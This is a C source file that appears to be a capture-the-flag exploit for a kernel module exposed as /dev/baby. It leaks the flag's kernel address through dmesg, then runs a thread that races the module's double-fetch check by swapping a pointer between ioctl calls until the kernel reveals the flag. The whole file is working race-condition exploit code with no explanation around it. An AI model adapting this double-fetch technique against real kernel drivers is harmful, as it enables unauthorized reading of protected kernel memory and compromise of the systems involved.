/* gcc exp.c -o exp -pthread -static */
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define BUFSZ 0x100

char buf[BUFSZ+1] = {0};
int finish = 0;
char *addr = 0;

struct guess_t {
    char *flag;
    long len;
} guess;

void *malicious(void *t) {
    struct guess_t *guess = t;
    while (finish == 0)
        guess->flag = addr;
}

int main(void) {
    int fd1 = open("/dev/baby", O_RDONLY);
    if (fd1 < 0) {
        fprintf(stderr, "failed to open %s: %d\n", "/proc/baby", fd1);
        exit(1);
    }

    ioctl(fd1, 0x6666);
    system("dmesg | tail > /tmp/addr");
    int fd2 = open("/tmp/addr", O_RDONLY);
    if (fd2 < 0) {
        fprintf(stderr, "failed to open %s: %d\n", "/tmp/addr", fd2);
        exit(1);
    }
    lseek(fd2, -BUFSZ, SEEK_END);
    read(fd2, buf, BUFSZ);
    close(fd2);
    char *r = strstr(buf, "Your flag is at ");
    if (r == NULL) {
        fprintf(stderr, "failed to get flag address!\n");
        exit(1);
    }
    r += strlen("Your flag is at ");
    addr = (char *) strtoull(r, NULL, 16);
    fprintf(stdout, "[+] flag address: %p\n", addr);

    guess.flag = buf;
    guess.len = strlen("flag{THIS_WILL_BE_YOUR_FLAG_1234}");

    pthread_t t;
    pthread_create(&t, NULL, malicious, &guess);

    for (;;) {
        if (ioctl(fd1, 0x1337, &guess) == 0)
            break;
        guess.flag = buf;
    }

    finish = 1;
    pthread_join(t, NULL);
    close(fd1);

    system("dmesg | tail -n 1");
    return 0;
}
